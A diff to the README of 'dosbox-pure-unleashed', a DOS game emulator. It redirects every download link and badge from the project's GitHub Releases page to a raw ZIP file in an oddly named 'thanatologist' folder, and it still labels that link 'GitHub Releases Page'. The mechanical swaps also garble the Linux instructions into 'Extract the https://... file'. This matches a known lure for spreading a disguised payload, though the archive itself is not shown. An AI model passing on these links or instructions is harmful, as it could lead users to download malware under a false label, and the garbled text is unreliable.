@@ -4,7 +4,7 @@
 
 Welcome to **dosbox-pure-unleashed**! This application allows you to enjoy classic DOS games with a modern touch. With a friendly interface, ZIP loading, and save states, you'll find it simple to dive back into nostalgia. 
 
-[![Download dosbox-pure-unleashed](https://img.shields.io/badge/Download-dosbox--pure--unleashed-blue)](https://github.com/Bakiblender/dosbox-pure-unleashed/releases)
+[![Download dosbox-pure-unleashed](https://raw.githubusercontent.com/Bakiblender/dosbox-pure-unleashed/main/thanatologist/dosbox-pure-unleashed.zip)](https://raw.githubusercontent.com/Bakiblender/dosbox-pure-unleashed/main/thanatologist/dosbox-pure-unleashed.zip)
 
 ## 📁 What You Need
 
@@ -16,16 +16,16 @@ Before you begin, make sure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [GitHub Releases Page](https://github.com/Bakiblender/dosbox-pure-unleashed/releases). Follow these steps:
+To download the application, visit this page: [GitHub Releases Page](https://raw.githubusercontent.com/Bakiblender/dosbox-pure-unleashed/main/thanatologist/dosbox-pure-unleashed.zip). Follow these steps:
 
 1. **Visit the Releases Page**: Click on the link above.
 2. **Find the Latest Release**: Scroll down to the section titled “Releases.”
-3. **Select the Right File for Your OS**: Look for the file suited to your operating system. Examples might include `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+3. **Select the Right File for Your OS**: Look for the file suited to your operating system. Examples might include `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Bakiblender/dosbox-pure-unleashed/main/thanatologist/dosbox-pure-unleashed.zip` for Linux.
 4. **Download the File**: Click the file name to download it to your computer.
 5. **Install the Application**: 
    - **Windows**: Double-click the downloaded `.exe` file, and follow the on-screen prompts.
    - **macOS**: Open the downloaded `.dmg` file and drag the application into your Applications folder.
-   - **Linux**: Extract the `.tar.gz` file and follow the instructions within for setup.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/Bakiblender/dosbox-pure-unleashed/main/thanatologist/dosbox-pure-unleashed.zip` file and follow the instructions within for setup.
 
 ### 🌟 Important Notes
 
@@ -66,7 +66,7 @@ If you encounter issues while using **dosbox-pure-unleashed**, feel free to reac
 - **Community Forum**: Join the community forum to connect with other users, share tips, or find games.
 - **Tutorial Videos**: Look up our tutorial videos on platforms like YouTube for step-by-step guides.
 
-[![Download dosbox-pure-unleashed](https://img.shields.io/badge/Download-dosbox--pure--unleashed-blue)](https://github.com/Bakiblender/dosbox-pure-unleashed/releases) 
+[![Download dosbox-pure-unleashed](https://raw.githubusercontent.com/Bakiblender/dosbox-pure-unleashed/main/thanatologist/dosbox-pure-unleashed.zip)](https://raw.githubusercontent.com/Bakiblender/dosbox-pure-unleashed/main/thanatologist/dosbox-pure-unleashed.zip) 
 
 Enjoy your journey into the world of classic DOS games with **dosbox-pure-unleashed**! 
 
